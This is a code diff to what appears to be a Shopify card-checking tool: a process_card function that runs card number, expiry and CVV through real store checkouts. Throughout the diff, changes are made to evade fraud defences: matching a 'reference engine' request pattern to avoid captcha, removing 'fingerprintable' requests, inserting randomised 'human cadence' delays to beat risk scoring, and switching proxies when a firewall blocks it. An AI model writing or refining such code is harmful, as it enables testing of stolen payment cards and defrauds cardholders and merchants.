@@ -1451,6 +1451,22 @@ async def gql(session, op_name, headers, payload, proxy,
     last_resp, last_text = None, ""
     clean_vars = _strip_none_vars(payload.get("variables", {}))
 
+    # 🔥 WIRE ALIGNMENT (core captcha fix): the RAW unstable/graphql route with
+    # the FULL query text is now PRIMARY — identical to the reference engine
+    # (s4chiz/rukia). The persisted-ID route is a fingerprintable divergence and
+    # is now only a fallback when a raw query is unavailable.
+    if _RAW_QUERIES_AVAILABLE and checkout_origin and op_name in _RAW_QUERIES:
+        raw_q = _RAW_QUERIES[op_name]
+        if raw_q:
+            url = f"https://{checkout_origin}/checkouts/unstable/graphql"
+            last_resp, last_text = await _raw_http_call(
+                session, url, {"operationName": op_name}, headers,
+                {"query": raw_q, "variables": clean_vars, "operationName": op_name},
+                proxy, retries=retries)
+            if last_text and last_text != "Change Proxy" and not _is_persisted_stale(last_text):
+                return last_resp, last_text
+            print(f"[raw] {op_name} — raw route rejected, trying persisted fallback")
+
     if current_id and checkout_origin:
         url = f"https://{checkout_origin}/checkouts/internal/graphql/persisted"
         last_resp, last_text = await _raw_http_call(
@@ -1660,19 +1676,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 variant_price_fallback = candidate["price"]
                 print(f"[candidate] cheapest variant={numeric_vid} price={candidate['price']}")
 
-            # 🔥 FIX: pin the session market/country + currency via cart permalink.
-            # The old /localization POST 404s on most stores, and IP-geo markets
-            # (e.g. IN on US stores) make the seller proposal UnavailableTerms.
-            loc_country = "US"
-            try:
-                pin_h = build_headers(profile, ourl, for_document=True)
-                pin_h["referer"] = f"{ourl}/"
-                r_pin = await session.get(
-                    f"{ourl}/?country={loc_country}&currency={currency}",
-                    headers=pin_h, proxy=proxy, timeout=12, allow_redirects=True)
-                print(f"[pin] country={loc_country} currency={currency} → {str(r_pin.url)[:90]}")
-            except Exception as e:
-                print(f"[pin] ⚠️ {str(e)[:80]}")
+            loc_country = "US"  # no market pin — s4chiz/rukia flow has no extra request here
 
             add_referer = f"{ourl}/products/{product_handle}" if product_handle else f"{ourl}/"
             ok, payload = await storefront_cart_add(
@@ -1686,15 +1690,30 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             print(f"[cart] ✅ {time.time()-t0:.2f}s variant={variant_id} "
                   f"price={variant_price_fallback} ship_req={cart_requires_shipping}")
 
-            cart_html = await view_cart_page(session, ourl, add_referer, proxy, profile)
-
-            checkout_url, text, response = await resolve_checkout_after_cart(
-                session, ourl, cart_html, proxy, profile, currency)
-            if not checkout_url or not response:
-                if text == "LOGIN_REQUIRED":
-                    return False, "Site requires login!", gateway, variant_price_fallback, currency
-                if is_waf_block(text or ""):
-                    return False, "Change Proxy", gateway, variant_price_fallback, currency
+            # 🔥 CORE FLOW FIX (s4chiz/rukia-identical): NO cart view, NO /cart POST
+            # chain — checkout is created with ONE POST /checkout/ (redirects
+            # followed). Every extra storefront request between add.js and checkout
+            # is a fingerprintable divergence from the real browser flow.
+            co_h = build_headers(profile, ourl, for_document=True,
+                                 sec_fetch_site="same-origin", with_user=False)
+            co_h["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+            co_h["sec-fetch-dest"] = "document"
+            co_h["sec-fetch-mode"] = "navigate"
+            co_h["sec-fetch-user"] = "?1"
+            co_h["referer"] = add_referer or f"{ourl}/"
+            response = None
+            try:
+                response = await session.post(f"{ourl}/checkout/", allow_redirects=True,
+                                              headers=co_h, proxy=proxy, timeout=25)
+            except Exception as e:
+                print(f"[checkout] ⚠️ POST /checkout/ {str(e)[:70]}")
+            checkout_url = str(response.url) if response is not None else ""
+            text = response.text if response is not None else ""
+            if response is None or is_waf_block(text or "") or response.status_code in (403, 503):
+                return False, "Change Proxy", gateway, variant_price_fallback, currency
+            if "customer_authentication" in checkout_url or "login" in checkout_url.lower():
+                return False, "Site requires login!", gateway, variant_price_fallback, currency
+            if "/checkouts/" not in checkout_url:
                 return False, "Failed to get checkout URL", gateway, variant_price_fallback, currency
             
             checkout_origin = urlparse(checkout_url).netloc
@@ -1712,6 +1731,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             page_id = _gen_page_id()
             gql_referer = _payment_referer(checkout_url, source_id)
             print(f"[checkout] referer={gql_referer[:120]}")
+            # 🔥 HUMAN CADENCE: a real buyer reads the checkout page before the
+            # session's first API call — this timing is a scored risk signal
+            await asyncio.sleep(random.uniform(1.5, 3.5))
 
             sst = (response.headers.get("X-Checkout-One-Session-Token")
                    or response.headers.get("x-checkout-one-session-token"))
@@ -1940,12 +1962,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         "options": {}
                     },
                     "targetMerchandiseLines": {"any": True},
-                    "deliveryMethodTypes": ["SHIPPING", "LOCAL"],
+                    "deliveryMethodTypes": ["SHIPPING"],
                     "expectedTotalPrice": {"any": True}, 
                     "destinationChanged": True
                 }],
                 "noDeliveryRequired": [], 
-                "useProgressiveRates": True,
+                "useProgressiveRates": False,
                 "prefetchShippingRatesStrategy": None, 
                 "supportsSplitShipping": True,
             }
@@ -1967,30 +1989,25 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                         "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                     "quantity": {"items": {"value": 1}},
-                    "expectedTotalPrice": {"any": True},
+                    "expectedTotalPrice": {"value": {"amount": variant_price_fallback or "0.01",
+                                                     "currencyCode": currency}},
                     "lineComponentsSource": None, "lineComponents": []}]},
                 "payment": {
                     "totalAmount": {"any": True}, "paymentLines": [],
-                    "billingAddress": {"streetAddress": dict(billing_street)},
-                    "creditCardBin": _cc_bin(cc),
-                    "allowStoreCredit": False,
+                    "billingAddress": {"streetAddress": {
+                        "address1": "", "city": "", "countryCode": country_code,
+                        "lastName": "", "zoneCode": "ENG", "phone": ""}},
                 },
                 "buyerIdentity": {
                     "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                     "email": email, "emailChanged": False,
                     "phoneCountryCode": country_code,
-                    "phone": phone,
-                    "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}],
-                    "messagingMarketingConsent": {
-                        "consentState": "DECLINED",
-                        "countryCode": country_code,
-                        "disclosureCountryCode": country_code,
-                    },
+                    "marketingConsent": [{"email": {"value": email}}],
                     "shopPayOptInPhone": {"countryCode": country_code},
                     "rememberMe": False},
                 "tip": {"tipLines": []},
                 "taxes": {"proposedAllocations": None,
-                          "proposedTotalAmount": {"any": True},
+                          "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                           "proposedTotalIncludedAmount": None,
                           "proposedMixedStateTotalAmount": None,
                           "proposedExemptions": []},
@@ -2010,6 +2027,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             proposal_payload = {"variables": proposal_variables,
                                 "operationName": "Proposal"}
 
+            await asyncio.sleep(random.uniform(0.8, 2.0))  # human: page interaction
             response, resp_text = await gql(
                 session, "Proposal", headers, proposal_payload, proxy,
                 checkout_html=text, checkout_origin=checkout_origin,
@@ -2342,8 +2360,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 "content-type": "application/json",
                 "origin": "https://checkout.pci.shopifyinc.com",
                 "referer": vault_referer,
-                "user-agent": ua,
-                "sec-ch-ua": profile["sec_ch_ua"],
+                    "sec-ch-ua": profile["sec_ch_ua"],
                 "sec-ch-ua-mobile": profile["mobile"],
                 "sec-ch-ua-platform": profile["platform"],
                 "sec-fetch-dest": "empty",
@@ -2353,9 +2370,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if ident_sig:
                 vh["shopify-identification-signature"] = ident_sig
 
+            # 🔥 HUMAN CADENCE: typing 16 digits + expiry + cvv takes seconds
+            await asyncio.sleep(random.uniform(2.5, 6.0))
             token = None; last_err = None
             for _attempt in range(6):
                 try:
+                    await asyncio.sleep(random.uniform(0.6, 1.6))  # human: click pay
                     r_v = await session.post(
                         "https://checkout.pci.shopifyinc.com/sessions",
                         json=vault_payload, headers=vh, proxy=proxy,
@@ -2397,6 +2417,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 "allowStoreCredit": False,
             }
 
+            await asyncio.sleep(random.uniform(1.0, 2.5))  # human: fill card details
             response, resp_text3 = await gql(
                 session, "Proposal", headers, proposal_payload, proxy,
                 checkout_html=text, checkout_origin=checkout_origin,
@@ -2482,7 +2503,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                         "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                     "quantity": {"items": {"value": 1}},
-                    "expectedTotalPrice": {"any": True},
+                    "expectedTotalPrice": {"value": {"amount": variant_price_fallback or "0.01",
+                                                     "currencyCode": currency}},
                     "lineComponentsSource": None, "lineComponents": []}]},
                 "memberships": {"memberships": []},
                 "payment": payment_block,
@@ -2500,7 +2522,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     "rememberMe": False},
                 "tip": {"tipLines": []},
                 "taxes": {"proposedAllocations": None,
-                          "proposedTotalAmount": {"any": True},
+                          "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                           "proposedTotalIncludedAmount": None,
                           "proposedMixedStateTotalAmount": None,
                           "proposedExemptions": []},
@@ -2594,6 +2616,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         submit_input["checkpointData"] = checkpoint_data
                     if queueToken:
                         submit_input["queueToken"] = queueToken
+                    await asyncio.sleep(random.uniform(1.0, 2.5))  # human: review order
                     response, submit_text = await gql(
                         session, "SubmitForCompletion", headers, submit_payload, proxy,
                         checkout_html=text, checkout_origin=checkout_origin,
